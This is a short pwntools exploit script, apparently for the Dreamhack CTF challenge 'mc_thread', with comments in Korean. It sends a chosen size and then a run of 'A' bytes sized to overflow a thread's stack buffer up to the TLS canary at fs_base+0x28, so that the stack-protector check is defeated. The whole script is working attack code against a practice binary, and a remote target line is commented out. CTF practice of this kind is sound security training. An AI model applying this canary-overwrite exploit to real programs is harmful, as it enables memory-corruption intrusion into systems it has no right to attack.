#!/usr/bin/env python3

from pwn import *

context.arch = 'x86_64' # 아키텍처 설정
p = process('./mc_thread', env= {"LD_PRELOAD" : "./libc.so.6"})
# p = remote('host3.dreamhack.games', '12018')
elf = ELF('./mc_thread')

# gdb.attach(p)
# pause()

DISTANCE = 0x928
p.sendlineafter("Size:", str(DISTANCE).encode())
data = b'A' * (DISTANCE + 8) # ($fs_base + 0x28) 와 ($rbp - 0x110) 사이 거리 + canary
p.sendlineafter("Data:", data)

p.interactive()
